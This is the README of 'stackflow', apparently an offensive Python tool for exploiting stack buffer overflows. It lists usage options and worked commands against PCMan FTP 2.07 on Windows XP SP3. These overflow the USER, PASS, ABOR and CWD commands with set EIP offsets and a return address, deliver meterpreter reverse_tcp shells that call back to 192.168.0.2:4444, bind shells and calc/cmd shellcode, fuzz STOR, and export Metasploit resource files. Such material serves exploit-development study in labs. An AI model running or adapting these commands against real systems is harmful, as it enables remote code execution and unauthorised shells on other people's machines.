stackflow
=========

Universal stack-based buffer overfow exploitation tool


Usage
=========

	usage: ./stackflow.py OPTIONS

	optional arguments:
	  -h, --help            show this help message and exit
	  -r RHOST, --rhost RHOST
	                        rhost
	  -p RPORT, --rport RPORT
	                        rport
	  -c CMDS, --cmds CMDS  commands to send to server before overflow
	  -v VULNCMD, --vulncmd VULNCMD
	                        vulnerable command
	  -o OFFSET, --offset OFFSET
	                        offset to EIP
	  -ao AUTOOFFSET, --autooffset AUTOOFFSET
	                        calculate offset from cyclic pattern EIP string
	  -a RETURNADD, --returnadd RETURNADD
	                        return address
	  -n NOPS, --nops NOPS  number of NOPS \x90 x 4 to prepend
	  -m PAYLOAD, --payload PAYLOAD
	                        MSF payload
	  -i LHOST, --lhost LHOST
	                        lhost
	  -l LPORT, --lport LPORT
	                        lport
	  -f FUZZ, --fuzz FUZZ  Fuzz with cyclic pattern of size
	  -t, --calc            Send calc.exe shellcode
	  -t1, --cmdprompt      Send cmd.exe shellcode
	  -d, --display         Display the exploit buffer
	  -q, --quiet           Display less cruft
	  -w TIMEOUT, --timeout TIMEOUT
	                        Timeout for socket (Default: 5)
	  -e CFEXPORT, --cfexport CFEXPORT
	                        Export exploit config and metasploit rc file
	  -g CFIMPORT, --cfimport CFIMPORT
	                        Import and run exploit from config file
	  -s STANDALONE, --standalone STANDALONE
	                        Export exploit to a standalone python script

All options can be input via the command line or read from a config file.

Some examples for PCMan FTP 2.07 running on WindowsXP SP3(ENG):

Vulnerable app: http://www.exploit-db.com/wp-content/themes/exploit/applications/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z


Exploit without any commands and send meterpreter/reverse_tcp shellcode dialing back to 192.168.0.2 on port 4444:

	./stackflow.py -i 192.168.0.2 -l 4444 -r 192.168.0.9 -p 21 -o 2012 -m windows/meterpreter/reverse_tcp -a 7E429353


Exploit the USER command and send meterpreter/reverse_tcp shellcode dialing back to 192.168.0.2 on port 4444:

	./stackflow.py -i 192.168.0.2 -l 4444 -r 192.168.0.9 -p 21 -o 2007 -m windows/meterpreter/reverse_tcp -v 'USER' -a 7E429353


Exploit the PASS command and send calc.exe shellcode:

	./stackflow.py -r 192.168.0.9 -p 21 -o 6103 -v 'PASS' -c 'USER anonymous' -a 7E429353 -t


Exploit the ABOR command and send meterpreter/bind_tcp shellcode listening on 4444:

	./stackflow.py -r 192.168.0.9 -p 21 -o 2007 -v 'ABOR' -c 'USER anonymous&PASS a@a.com' -a 7E429353 -l 4444 -m windows/meterpreter/bind_tcp


Exploit the CWD command and send cmd.exe shellcode and display the exploit buffer:

	./stackflow.py -r 192.168.0.9 -p 21 -o 2008 -v 'CWD' -c 'USER anonymous&PASS a@a.com' -a 7E429353 -t1 -d


Fuzz the STOR command with a cyclic buffer of size 3000:

	./stackflow.py -r 192.168.0.9 -p 21 -v 'STOR' -c 'USER anonymous&PASS a@a.com' -f 3000


Exploit the CWD command with auto-offset string from EIP after fuzzing crash and send cmd.exe shellcode:

	./stackflow.py -r 192.168.0.9 -p 21 -ao o9Cp -v 'CWD' -c 'USER anonymous&PASS a@a.com' -a 7E429353 -t1


Export the exploit py and metasploit rc file:

	./stackflow.py -r 192.168.0.9 -p 21 -o 2008 -v 'CWD' -c 'USER anonymous&PASS a@a.com' -a 7E429353 -e revCWD -l 4444 -m windows/meterpreter/reverse_tcp -i 192.168.0.2


Start msfconsole and run the exploit and handler:

	msfconsole -r revCWD.rc


Run the exploit and handler from msfconsole:

	resource /path/to/revCWD.rc


Run an exploit from a config file (no handler!):

	./stackflow.py -g revCWD(.py)
